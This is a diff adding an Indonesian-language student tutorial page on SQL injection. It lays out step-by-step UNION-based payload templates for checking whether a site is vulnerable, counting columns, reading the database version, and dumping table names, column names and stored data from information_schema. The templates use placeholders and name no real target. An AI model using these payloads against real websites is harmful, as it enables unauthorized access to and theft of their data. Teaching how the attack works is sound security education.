@@ -1,0 +1,113 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Tutorial SQL Injection</title>
+    <link rel="stylesheet" type="text/css" href="../css/sqli.css" />
+  </head>
+
+  <body>
+    <header>
+        <div class="logo">
+            <img src="../Picture/sqli.png" alt="">
+        </div>
+    
+        <div class="title">
+            <h1>SQL Injection</h1>
+        </div>
+    </header>
+
+    <div class="content">
+        <div class="intro">
+            <div class="title">
+                <h2>Step 1 - Vulnerable</h2>
+            </div>
+            <div class="information">
+                <p>
+                    Pertama-tama mari kita pastikan  webnya rentan. Untuk memeriksa apakah web rentan atau tidak, cukup beri tanda kutip tunggal ( ` ). Jika terjadi kesalahan, itu berarti vuln.
+                </p>
+            </div>
+            <div class="title">
+                <h2>Step 2 - Balancing</h2>
+            </div>
+            <div class="information">
+                <p>
+                    Tahap selanjutnya adalah menentukan balancing pada payload.
+                    <br>
+                    Balancing : -- / --+ / --+-
+                </p>
+            </div>
+            <div class="title">
+                <h2>Step 3 - Sum Column</h2>
+            </div>
+            <div class="information">
+                <p>
+                    Langkah selanjutnya adalah menentukan jumlah kolom pada tabel di database yang sedang digunakan oleh web. Triknya adalah menggunakan urutan dan mencari tahu nomor mana yang hilang.
+                    <br>
+                    {params url}' order by .{number}..{balancing}
+                </p>
+            </div>
+            <div class="title">
+                <h2>Step 4 - Find Number</h2>
+            </div>
+            <div class="information">
+                <p>
+                    Angka ini bisa diperoleh dengan menjalankan payload :
+                    <br>
+                    {params url}' union select .{column}..{balancing}
+                </p>
+            </div>
+            <div class="title">
+                <h2>Step 5 - Database Version</h2>
+            </div>
+            <div class="information">
+                <p>
+                    Langkah ini hanya untuk memastikan bahwa database yang digunakan adalah versi 5. Alasannya adalah ketika kita menemukan situs web target yang menggunakan DB versi 4, kita harus menebak nama tabelnya.
+                    <br>
+                    {params url}' union select .{column},@@version,..{balancing}
+                </p>
+            </div>
+            <div class="title">
+                <h2>Step 6 - Bring up table name</h2>
+            </div>
+            <div class="information">
+                <p>
+                    {params url}' union select .{column}.group_concat(table_name)..from information_schema.tables where table_schema=database() {balancing}
+                </p>
+            </div>
+            <div class="title">
+                <h2>Step 7 - Bring up list column</h2>
+            </div>
+            <div class="information">
+                <p>
+                    {params url}' union select .{column}.group_concat(column_name)..from information_schema.columns where table_name=0x{nama tabel setelah di convert ke hex} {balancing}
+                </p>
+            </div>
+            <div class="title">
+                <h2>Step 8 - Bring up data from column</h2>
+            </div>
+            <div class="information">
+                <p>
+                    {params url}' union select .{column}.group_concat({column},0x3a,{column},..,dst..)..from {nama tabel} {balancing}
+                </p>
+            </div>
+        </div>
+
+        <div class="credits">
+            <div class="title">
+
+                <h2>Credits</h2>
+                
+            </div>
+
+            <div class="team">
+                <p>
+                    · 2502004405 - Dimas Syauqi Syafa (Computer Science) ·  
+                </p>
+            </div>
+        </div>
+    </div>
+
+  </body>
+</html>
